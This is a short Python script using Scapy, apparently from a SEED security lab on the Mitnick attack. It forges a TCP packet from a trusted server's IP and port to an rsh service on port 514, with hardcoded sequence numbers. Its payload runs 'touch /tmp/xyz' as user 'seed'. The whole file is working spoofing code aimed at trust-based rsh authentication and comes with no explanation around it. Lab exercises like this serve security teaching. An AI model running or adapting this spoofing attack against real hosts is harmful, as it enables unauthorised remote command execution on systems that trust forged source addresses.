#!usr/bin/python3
from scapy.all import *
import sys

X_terminal_IP = "10.9.0.5"
X_terminal_Port = 514

Trusted_Server_IP = "10.9.0.6"
Trusted_Server_Port = 1023




IPLayer = IP(src=Trusted_Server_IP, dst=X_terminal_IP)
TCPLayer = TCP(sport=Trusted_Server_Port,dport=X_terminal_Port,flags="A",
       seq=778933537, ack=1429036382)
print("Sending Spoofed RSH Data Packet ...")
data = '9090\x00seed\x00seed\x00touch /tmp/xyz\x00'
pkt = IPLayer/TCPLayer/data
send(pkt,verbose=0) 
